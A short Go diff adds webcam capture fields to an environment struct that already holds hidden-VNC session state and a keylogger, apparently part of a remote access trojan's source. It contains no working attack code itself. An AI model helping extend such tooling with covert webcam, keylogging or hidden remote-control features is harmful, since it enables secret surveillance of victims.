@@ -34,6 +34,12 @@ type Env struct {
 	HVNCCancel          context.CancelFunc
 	HVNCDone            chan struct{}
 	HVNCMu              sync.Mutex
+	WebcamDeviceIndex   int
+	WebcamFPS           int
+	WebcamUseMaxFPS     bool
+	WebcamCancel        context.CancelFunc
+	WebcamDone          chan struct{}
+	WebcamMu            sync.Mutex
 	// Other fields
 	Plugins                   *plugins.Manager
 	Keylogger                 *keylogger.Keylogger
